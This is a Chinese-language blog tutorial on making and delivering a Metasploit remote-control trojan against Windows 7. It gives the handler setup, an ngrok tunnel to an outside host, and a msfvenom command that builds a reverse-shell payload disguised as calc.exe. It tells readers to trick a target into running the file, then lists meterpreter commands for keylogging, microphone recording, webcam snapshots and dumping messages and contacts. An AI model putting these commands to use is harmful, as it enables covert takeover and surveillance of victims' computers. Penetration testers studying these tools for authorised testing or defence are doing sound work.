---
title: "msf配合ngrok远控基础"
categories: [ "安全技术" ]
tags: [ "webshell","MSF","木马","远控" ]
draft: false
slug: "52"
date: "2019-03-19 20:45:00"
---

本文于 2019-03-19 创作，原标题为“msf 生成远控木马及免杀初探”
2019-12-27 重写，删除了包括安卓的部分，只测试 win7 远控的效果

---

## 介绍

远控也就是远程控制，是通过使用户点击我们准备好的远控木马达到控制用户电脑的效果

基础材料：

- Kali 2019.4
- Win7 SP1
- ngrok 免费服务器一台

此外，**ngrok 不是唯一远控服务器端，你的 kali 布置在外网就不用中间商，或者你也可以自己搭建类似的内网穿透服务器**

本文只是基础教程，做备忘录用

## 过程

### 在 msf 中

直接快速后台监听

    handler -H 192.168.2.6 -P 8080 -p windows/x64/meterpreter/reverse_tcp

![][1]

可使用`jobs`

命令查看后台任务，或者按照正常流程来：

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.2.6(本地kali的ip)
set LPORT 8080(本地监听的端口)
set ExitOnSession false(防止假session)
exploit -j -z(-j为后台任务，-z为持续监听)
```

![][2]

### 在 ngrok 中

在[官网][3]注册并开通一个免费隧道

![][4]

ngrok 的端口可以随便填一个大于 1024 的就行，这个填了不能修改

本地的 ip 和端口就是上面设置的 kali 本机的 ip 和端口，后期是可以修改的

申请成功后在 kali 本机上下载 ngrok 的[客户端][5]

解压后在文件夹内新开一个终端，使用命令：

    ./sunny clientid 你的隧道id

就可以开始监听了：

![][6]

ngrok 的基础操作在以前的文章：[《WinRAR 目录穿越漏洞 - CVE-2018-20250 复现》][7]也有写过

### 生成木马的部分

监听部分完成了就可以开始生成木马传给目标主机了

在终端中输入以下命令：

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ngrok免费服务器地址(不包括前面的协议) LPORT=ngrok申请时填的端口 -f exe -o calc.exe

就可以生成一个最基础的，无免杀的远控木马：

![][8]

将这个木马传给目标主机并诱骗点击，在 msf 中则可以获取到 meterpreter 会话：

![][9]

可能会不稳定，这就取决于网络连接状况和免杀效果了,现在的 payload 是一定会被 360 和火绒拦截的

附上`meterpreter`的常用操作命令：

| 命令                  | 功能                                   |
| --------------------- | -------------------------------------- |
| keyscan_start         | 开始键盘记录                           |
| keyscan_stop          | 结束键盘记录                           |
| keyscan_dump          | 下载键盘记录                           |
| record_mic            | 录制声音（如果目标主机上有话筒的话）   |
| screenshot            | 截屏                                   |
| webcam_chat           | 查看摄像头接口                         |
| webcam_list           | 查看摄像头列表                         |
| webcam_stream         | 开启摄像头                             |
| webcam_snap           | 隐秘拍照功能 -i num 指定开启哪个摄像头 |
| run vnc               | 开启远程桌面                           |
| dump_contacts         | 导出电话号码                           |
| dump_sms              | 导出信息                               |
| 可以输入?查看更多命令 |

本文完。

[1]: https://img.soapffz.com/archives_img/2019/03/19/archives_20191227_160836.png
[2]: https://img.soapffz.com/archives_img/2019/03/19/archives_20191227_160608.png
[3]: http://www.ngrok.cc/
[4]: https://img.soapffz.com/archives_img/2019/03/19/archives_20191227_155717.png
[5]: http://www.ngrok.cc/download.html
[6]: https://img.soapffz.com/archives_img/2019/03/19/archives_20191227_160158.png
[7]: https://soapffz.com/27.html
[8]: https://img.soapffz.com/archives_img/2019/03/19/archives_20191227_161533.png
[9]: https://img.soapffz.com/archives_img/2019/03/19/archives_20191227_162045.png